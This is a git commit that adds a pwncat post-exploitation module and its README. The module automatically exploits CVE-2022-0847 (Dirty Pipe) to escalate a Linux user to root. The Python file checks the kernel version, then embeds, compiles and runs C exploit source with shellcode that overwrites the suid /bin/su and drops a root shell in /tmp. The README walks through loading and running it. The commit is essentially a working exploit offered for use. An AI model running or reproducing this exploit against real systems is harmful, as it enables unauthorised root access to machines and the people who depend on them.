090c0bbf3ac2afe5a8a320ebef62fdd6e0dfcbfc
Dana Epp <dana@vulscan.com>
2022-03-20 23:09:58 +0000

    Initial commit. Have to work on the SSH connection closing issue on compile

--- README.md
+++ README.md
@@ -1,2 +1,35 @@
 # pwncat_dirtypipe
 pwncat module that automatically exploits CVE-2022-0847 (dirtypipe)
+## Introduction
+The purpose of this module is to attempt to exploit CVE-2022-0847 (dirtypipe) on a target when using pwncat.
+
+There is no need to setup any directories, compile any source or even have gcc on the remote target; the dirtypipe module takes care of this automatically using the pwncat framework.
+
+## Setup and Use
+- Simply copy `dirtypipe.py` somewhere on your host where pwncat-cs is installed. ie: /home/user/pwncat_mods
+- In pwncat, simply type: `load /home/user/pwncat_mods`
+- To confirm the module loaded, type: `search dirtypipe`. You should see something like this:
+```
+(local) pwncat$ search dirtypipe
+                                                      Results                                                      
+                   ╷                                                                                               
+  Name             │ Description                                                                                   
+ ══════════════════╪══════════════════════════════════════════════════════════════════════════════════════════════ 
+  dirtypipe        │ Exploit CVE-2022-0847 to local privesc to root via dirtypipe
+``` 
+- To execute, simply type `run dirtypipe`. If it's successful, you should see the UID change to 0, and now be root. ie:
+```
+(local) pwncat$ run dirtypipe
+
+```
+
+## Tips
+- If you don't want to always call `load`, you can have pwncat automatically load this module on startup by placing it in `~/.local/share/pwncat/modules`
+- To use the cross-compiler to build the exploit on your machine and upload it to the target, you need to set the **cross** variable in your pwncatrc file. This file is typically found at ~/.local/share/pwncat/pwncatrc`. ie:
+```
+# Set the gcc path
+set cross "/usr/bin/gcc"
+```
+
+## Thanks
+A special shout out to [Caleb Stewart](https://github.com/calebstewart/pwncat) for having an awesome framework to build this on top of.  
---
+++ dirtypipe.py
@@ -0,0 +1,288 @@
+#!/usr/bin/env python3
+
+import rich.markup
+import textwrap
+import subprocess
+from subprocess import CalledProcessError
+from io import StringIO
+
+from pwncat import util
+from pwncat.db import Fact
+from pwncat.modules import Status, BaseModule, ModuleFailed, Argument
+from pwncat.manager import Session
+from pwncat.platform.linux import Linux
+from pwncat.platform import PlatformError, Path
+
+def errcheck(result, func, args):
+    if not result:
+        print("NORESULT")
+    else:
+        print(result)
+
+class Module(BaseModule):
+    """ Exploit CVE-2022-0847 to local privesc to root via dirty pipes """
+
+    """
+    Based on original PoC at https://haxx.in/files/dirtypipez.c
+    
+    Usage: run dirtypipe 
+    """
+    PLATFORM = [Linux]
+    ARGUMENTS = {}
+
+    def is_kernel_vulnerable(self, kernel_version):
+        vulnerable = True
+
+        try:
+            kernel_ver = int((kernel_version.split("."))[0])
+            major_ver = int((kernel_version.split("."))[1])
+            minor_ver = int((kernel_version.split("."))[2])
+        except ValueError:
+            raise ModuleFailed( f"Could not parse retrieved kernel version to check for dirtypipe")
+        
+        if kernel_ver != 5:
+            vulnerable = False
+        else:
+            if kernel_ver == 5 and major_ver < 8:
+                vulnerable = False
+            if kernel_ver == 5 and major_ver == 10 and minor_ver >= 102:
+                vulnerable = False
+            if kernel_ver == 5 and major_ver == 15 and minor_ver >= 25:
+                vulnerable = False
+            if kernel_ver == 5 and major_ver == 16 and minor_ver >= 11:
+                vulnerable = False
+        
+        return vulnerable 
+
+    def run(self, session: "pwncat.manager.Session"):
+
+        yield Status( "checking to see if target is vulnerable to dirtypipe...")
+
+        output = session.platform.run(
+            "uname -r", capture_output=True, text=True, check=True
+        )
+
+        kernel_version = output.stdout.split("-")[0]
+
+        if not kernel_version:
+            raise ModuleFailed( f"Could not retrieve kernel version to check for dirtypipe")        
+
+        if not self.is_kernel_vulnerable(kernel_version):
+            session.log( f"It appears that this kernel ({kernel_version}) is not vulnerable to dirtypipe." )
+            yield Status( "Cannot privesc to [red]root[/red]")
+            return  
+
+        session.log( f"It appears that this kernel ({kernel_version}) IS vulnerable to dirtypipe!" )
+        
+        yield Status( "preparing to privesc to [red]root[/red] via dirtypipe")
+
+        # Write the ELF source code
+        dirtypipez_source = textwrap.dedent(
+            f"""
+                #define _GNU_SOURCE
+                #include <unistd.h>
+                #include <fcntl.h>
+                #include <stdio.h>
+                #include <stdlib.h>
+                #include <string.h>
+                #include <sys/stat.h>
+                #include <sys/user.h>
+                #include <stdint.h>
+
+                #ifndef PAGE_SIZE
+                #define PAGE_SIZE 4096
+                #endif
+
+                unsigned char elfcode[] = {{
+                    0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
+                    0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,
+                    0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00,
+                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                    0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00, 0x01, 0x00, 0x00, 0x00,
+                    0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00,
+                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00,
+                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
+                    0x97, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x97, 0x01, 0x00, 0x00,
+                    0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                    0x48, 0x8d, 0x3d, 0x56, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc6, 0x41, 0x02,
+                    0x00, 0x00, 0x48, 0xc7, 0xc0, 0x02, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48,
+                    0x89, 0xc7, 0x48, 0x8d, 0x35, 0x44, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc2,
+                    0xba, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc0, 0x01, 0x00, 0x00, 0x00, 0x0f,
+                    0x05, 0x48, 0xc7, 0xc0, 0x03, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x8d,
+                    0x3d, 0x1c, 0x00, 0x00, 0x00, 0x48, 0xc7, 0xc6, 0xed, 0x09, 0x00, 0x00,
+                    0x48, 0xc7, 0xc0, 0x5a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x31, 0xff,
+                    0x48, 0xc7, 0xc0, 0x3c, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x2f, 0x74, 0x6d,
+                    0x70, 0x2f, 0x73, 0x68, 0x00, 0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01,
+                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x3e,
+                    0x00, 0x01, 0x00, 0x00, 0x00, 0x78, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00,
+                    0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38,
+                    0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00,
+                    0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                    0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40,
+                    0x00, 0x00, 0x00, 0x00, 0x00, 0xba, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+                    0x00, 0xba, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00,
+                    0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x31, 0xff, 0x48, 0xc7, 0xc0, 0x69,
+                    0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x31, 0xff, 0x48, 0xc7, 0xc0, 0x6a,
+                    0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0x8d, 0x3d, 0x1b, 0x00, 0x00, 0x00,
+                    0x6a, 0x00, 0x48, 0x89, 0xe2, 0x57, 0x48, 0x89, 0xe6, 0x48, 0xc7, 0xc0,
+                    0x3b, 0x00, 0x00, 0x00, 0x0f, 0x05, 0x48, 0xc7, 0xc0, 0x3c, 0x00, 0x00,
+                    0x00, 0x0f, 0x05, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00
+                }};
+                
+                static void prepare_pipe(int p[2])
+                {{
+                    if (pipe(p)) abort();
+
+                    const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
+                    static char buffer[4096];
+
+                    for (unsigned r = pipe_size; r > 0;) {{
+                        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
+                        write(p[1], buffer, n);
+                        r -= n;
+                    }}
+
+                    for (unsigned r = pipe_size; r > 0;) {{
+                        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
+                        read(p[0], buffer, n);
+                        r -= n;
+                    }}
+                }}
+
+                int hax(char *filename, long offset, uint8_t *data, size_t len) {{
+                    const int fd = open(filename, O_RDONLY); 
+                    if (fd < 0) {{
+                        perror("open failed");
+                        return -1;
+                    }}
+
+                    struct stat st;
+                    if (fstat(fd, &st)) {{
+                        perror("stat failed");
+                        return -1;
+                    }}
+
+                    int p[2];
+                    prepare_pipe(p);
+
+                    --offset;
+                    ssize_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
+                    if (nbytes < 0) {{
+                        perror("splice failed");
+                        return -1;
+                    }}
+                    if (nbytes == 0) {{
+                        fprintf(stderr, "short splice\\n");
+                        return -1;
+                    }}
+
+                    nbytes = write(p[1], data, len);
+                    if (nbytes < 0) {{
+                        perror("write failed");
+                        return -1;
+                    }}
+                    if ((size_t)nbytes < len) {{
+                        fprintf(stderr, "short write\\n");
+                        return -1;
+                    }}
+
+                    close(fd);
+
+                    return 0;
+                }}
+
+                int main(int argc, char **argv) {{
+                    
+                    char *path = "/bin/su";
+                    uint8_t *data = elfcode;
+
+                    int fd = open(path, O_RDONLY);
+                    uint8_t *orig_bytes = malloc(sizeof(elfcode));
+                    lseek(fd, 1, SEEK_SET);
+                    read(fd, orig_bytes, sizeof(elfcode));
+                    close(fd);
+
+                    printf("[+] hijacking suid binary..\\n");
+                    if (hax(path, 1, elfcode, sizeof(elfcode)) != 0) {{
+                        printf("[~] failed\\n");
+                        return EXIT_FAILURE;
+                    }}
+
+                    printf("[+] dropping suid shell..\\n");
+                    system(path);
+
+                    printf("[+] restoring suid binary..\\n");
+                    if (hax(path, 1, orig_bytes, sizeof(elfcode)) != 0) {{
+                        printf("[~] failed\\n");
+                        return EXIT_FAILURE;
+                    }}
+
+                    printf("[+] popping root shell.. (dont forget to clean up /tmp/sh ;))\\n");
+                    system("/tmp/sh");
+
+                    return EXIT_SUCCESS;
+                }}
+                """
+        ).lstrip()
+
+        elf_code_source = textwrap.dedent(
+            f"""
+                #include <stdio.h>
+                #include <stdlib.h>
+                #include <unistd.h>
+                int main(int argc, char *argv[]) {{
+                    setuid(0); setgid(0);
+                    seteuid(0); setegid(0);
+                    execve("/bin/sh", ["/bin/sh", NULL], [NULL]);
+                }}
+            """
+        ).lstrip()
+
+        current_user = session.current_user()
+        orig_id = current_user.id
+
+        with session.platform.tempfile(mode="w", directory="/tmp") as filp:
+            rootshell = filp.name
+
+        # Compile dirtypipez exploit binary
+        try:
+            yield Status( "compiling dirtypipe exploit")
+            rootshell = session.platform.compile(
+                [StringIO(dirtypipez_source)],
+                output=rootshell
+            )
+        except PlatformError as exc:
+            raise ModuleFailed( f"compilation failed for dirtypipez exploit: {exc}") from exc
+        except Exception as exc2:
+            raise ModuleFailed( f"General exception occured while building dirtypipez exploit: {exc2}") from exc2
+
+        try:
+            yield Status( "attempting to privesc to [red]root[/red]")               
+            proc = session.platform.Popen( 
+                [rootshell], 
+                stdin=subprocess.PIPE,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE
+            )
+
+            proc.detach()
+            
+            if session.platform.refresh_uid() != 0:
+                session.log( "refresh_uid didn't work" )
+                yield Status( "Failed to privesc to [red]root[/red]")     
+
+            # Remove the rootshell
+            session.platform.Path(rootshell).unlink()
+
+        except CalledProcessError as exc:
+            session.log( "Failed privesc" )
+            raise ModuleFailed(f"privesc failed: {exc}") from exc
+        
+        current_user = session.current_user()
+        curr_id = current_user.id
+
+        uid_status = f"UID : Before([blue]{orig_id}[/blue]) | After({curr_id})"
+        yield Status( f"{uid_status}") 
+            
+        session.log( f"ran {self.name}. {uid_status}")
